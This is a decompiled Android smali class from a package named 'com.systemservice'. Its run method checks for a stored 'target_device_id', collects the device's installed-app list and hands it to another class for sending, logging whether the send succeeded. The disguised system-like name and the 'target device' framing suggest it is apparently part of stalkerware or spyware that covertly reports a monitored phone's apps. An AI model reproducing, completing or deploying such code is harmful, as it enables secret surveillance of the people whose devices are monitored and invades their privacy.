.class Lcom/systemservice/a/c/a/b;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/a/c/a/c;->b(Landroid/content/Context;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Landroid/content/Context;

.field final synthetic b:Lcom/systemservice/a/c/a/c;


# direct methods
.method constructor <init>(Lcom/systemservice/a/c/a/c;Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/a/c/a/b;->b:Lcom/systemservice/a/c/a/c;

    iput-object p2, p0, Lcom/systemservice/a/c/a/b;->a:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    const-string v0, ""

    :try_start_0
    iget-object v1, p0, Lcom/systemservice/a/c/a/b;->b:Lcom/systemservice/a/c/a/c;

    invoke-static {v1}, Lcom/systemservice/a/c/a/c;->b(Lcom/systemservice/a/c/a/c;)Landroid/content/SharedPreferences;

    move-result-object v1

    const-string v2, "target_device_id"

    invoke-interface {v1, v2, v0}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_2

    new-instance v0, Lcom/systemservice/a/c/a/d;

    iget-object v1, p0, Lcom/systemservice/a/c/a/b;->a:Landroid/content/Context;

    const/4 v2, 0x0

    invoke-direct {v0, v1, v2}, Lcom/systemservice/a/c/a/d;-><init>(Landroid/content/Context;Z)V

    iget-object v1, p0, Lcom/systemservice/a/c/a/b;->b:Lcom/systemservice/a/c/a/c;

    invoke-static {v1}, Lcom/systemservice/a/c/a/c;->c(Lcom/systemservice/a/c/a/c;)Lcom/systemservice/a/h/c;

    move-result-object v1

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3, v3}, Lcom/systemservice/a/h/c;->a(ZLjava/util/Date;Ljava/util/Date;)Ljava/util/List;

    move-result-object v1

    iget-object v2, p0, Lcom/systemservice/a/c/a/b;->a:Landroid/content/Context;

    invoke-virtual {v0, v1, v2}, Lcom/systemservice/a/c/a/d;->a(Ljava/util/List;Landroid/content/Context;)I

    move-result v0

    const/4 v2, 0x1

    if-ne v0, v2, :cond_0

    sget-object v2, Lcom/systemservice/a/a/j;->h:Lorg/apache/log4j/Logger;

    const-string v3, "App Manager: SEND list AppInstall successful"

    invoke-virtual {v2, v3}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    iget-object v2, p0, Lcom/systemservice/a/c/a/b;->b:Lcom/systemservice/a/c/a/c;

    invoke-static {v2}, Lcom/systemservice/a/c/a/c;->a(Lcom/systemservice/a/c/a/c;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "SEND notification of list App successful"

    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v2, p0, Lcom/systemservice/a/c/a/b;->b:Lcom/systemservice/a/c/a/c;

    invoke-static {v2}, Lcom/systemservice/a/c/a/c;->c(Lcom/systemservice/a/c/a/c;)Lcom/systemservice/a/h/c;

    move-result-object v2

    :goto_0
    invoke-virtual {v2, v1}, Lcom/systemservice/a/h/c;->a(Ljava/util/List;)V

    goto :goto_1

    :cond_0
    const/16 v2, -0x14

    if-ne v0, v2, :cond_1

    sget-object v2, Lcom/systemservice/a/a/j;->h:Lorg/apache/log4j/Logger;

    const-string v3, "App Manager: SEND list AppInstall duplicate"

    invoke-virtual {v2, v3}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    iget-object v2, p0, Lcom/systemservice/a/c/a/b;->b:Lcom/systemservice/a/c/a/c;

    invoke-static {v2}, Lcom/systemservice/a/c/a/c;->a(Lcom/systemservice/a/c/a/c;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "SEND notification of List AppInstall duplicate"

    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v2, p0, Lcom/systemservice/a/c/a/b;->b:Lcom/systemservice/a/c/a/c;

    invoke-static {v2}, Lcom/systemservice/a/c/a/c;->c(Lcom/systemservice/a/c/a/c;)Lcom/systemservice/a/h/c;

    move-result-object v2

    goto :goto_0

    :cond_1
    iget-object v1, p0, Lcom/systemservice/a/c/a/b;->b:Lcom/systemservice/a/c/a/c;

    invoke-static {v1}, Lcom/systemservice/a/c/a/c;->a(Lcom/systemservice/a/c/a/c;)Ljava/lang/String;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v3, "SEND list App Error"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :goto_1
    iget-object v1, p0, Lcom/systemservice/a/c/a/b;->b:Lcom/systemservice/a/c/a/c;

    invoke-static {v1}, Lcom/systemservice/a/c/a/c;->a(Lcom/systemservice/a/c/a/c;)Ljava/lang/String;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "ret_code = "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    :catch_0
    move-exception v0

    iget-object v1, p0, Lcom/systemservice/a/c/a/b;->b:Lcom/systemservice/a/c/a/c;

    invoke-static {v1}, Lcom/systemservice/a/c/a/c;->a(Lcom/systemservice/a/c/a/c;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_2
    :goto_2
    return-void
.end method
